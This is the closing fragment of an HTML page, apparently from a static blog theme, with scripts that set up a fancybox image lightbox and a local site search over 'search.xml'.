<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
